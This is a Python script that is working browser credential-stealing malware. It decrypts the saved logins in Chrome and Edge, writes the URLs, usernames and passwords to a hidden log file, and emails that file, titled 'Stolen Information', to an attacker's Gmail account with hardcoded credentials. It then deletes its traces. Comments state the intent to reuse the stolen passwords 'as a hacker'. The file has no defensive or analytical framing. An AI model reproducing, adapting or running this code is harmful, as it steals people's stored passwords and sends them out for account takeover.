from email.message import EmailMessage
import os
import json
import base64
import smtplib
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
import smtplib
from email.message import EmailMessage
from subprocess import call

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def main():
    # get the AES key
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    key = get_encryption_key(local_state_path)
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    open('log.txt', 'w').close()
    call( "attrib +h log.txt" , creationflags= 0x08000000)
    call( f"attrib +h {filename}" , creationflags= 0x08000000)
    usernameList = []
    passwordList = []
    with open('log.txt', 'a') as f:
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            date_last_used = str(get_chrome_datetime(date_last_used)).split('.')[0]
            #from here we shall edit the given file
            #so since we collected the information from decrypter
            #we wanna create a new file which holds all username, correlated password, correlated website, last acessed
            f.write('origin_url: '  + origin_url + '\n')
            f.write('username: '  + username + '\n')
            f.write('password: '  + password + '\n')
            f.write('date_last_used: '  + date_last_used + '\n')
            f.write('=============================================================\n')

            #we also wanna grab a list of the passwords and username
            #this is because people tend to repeat passwords and username combinations so we can reuse this as a hacker
            if username not in usernameList and username:
                usernameList.append(username)
            if password not in passwordList and password:
                passwordList.append(password)
    cursor.close()
    db.close()


    #repeat with microsoft edge

    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Microsoft", "Edge",
                                    "User Data", "Local State")
    key = get_encryption_key(local_state_path)
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Microsoft", "Edge", "User Data", "Default", "Login Data")
    filename = "EdgeData.db"
    shutil.copyfile(db_path, filename)
    call( f"attrib +h {filename}" , creationflags= 0x08000000)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created") 
    with open('log.txt', 'a') as f:
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            date_last_used = str(get_chrome_datetime(date_last_used)).split('.')[0]
            #from here we shall edit the given file
            #so since we collected the information from decrypter
            #we wanna create a new file which holds all username, correlated password, correlated website, last acessed
            f.write('origin_url: '  + origin_url + '\n')
            f.write('username: '  + username + '\n')
            f.write('password: '  + password + '\n')
            f.write('date_last_used: '  + date_last_used + '\n')
            f.write('=============================================================\n')

            #we also wanna grab a list of the passwords and username
            #this is because people tend to repeat passwords and username combinations so we can reuse this as a hacker
            if username not in usernameList and username:
                usernameList.append(username)
            if password not in passwordList and password:
                passwordList.append(password)
        f.write('this is all usernames found ' + str(usernameList) + '\n')
        f.write('=============================================================\n')
        f.write('this is all passwords found ' + str(passwordList) + '\n')
        f.write('=============================================================\n')
    cursor.close()
    db.close()


    #now to get firefox password
    #problem with firefox is that it implements a different

    msg = EmailMessage()
    msg['Subject'] = 'Stolen Information'
    msg['From'] = 'hackingman4321@gmail.com'
    msg['To'] = 'hackingman4321@gmail.com'
    password = 'hackingman1!'
    with open('log.txt', 'rb') as f:
        file_data = f.read()
        file_name = f.name
    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login('hackingman4321@gmail.com', password)
        smtp.send_message(msg)
    try:
        # try to remove the copied db file
        os.remove('ChromeData.db')
        os.remove('EdgeData.db')
        os.remove('log.txt')
    except:
        pass
    
if __name__ == "__main__":
    main()